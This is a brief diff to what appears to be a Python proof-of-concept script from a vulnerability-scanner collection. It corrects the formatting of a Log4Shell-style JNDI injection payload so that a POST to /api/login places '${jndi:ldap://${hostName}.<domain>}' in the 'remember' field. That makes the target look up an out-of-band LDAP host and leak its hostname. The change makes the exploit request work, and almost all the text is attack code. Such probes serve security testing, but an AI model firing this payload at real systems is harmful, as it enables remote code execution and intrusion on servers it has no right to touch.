@@ -42,7 +42,7 @@ def poc(url):
 
         path = """/api/login"""
         method = "POST"
-        data = """{"username":"user","password":"pass","remember":"${jndi:ldap://${hostName}.oob_domain}","strict":true}"""
+        data = """{"username":"user","password":"pass","remember":"${jndi:ldap://${hostName}.%s}","strict":true}""" % oob_domain
         headers = {'Content-Type': 'application/json; charset=utf-8'}
         resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)
 
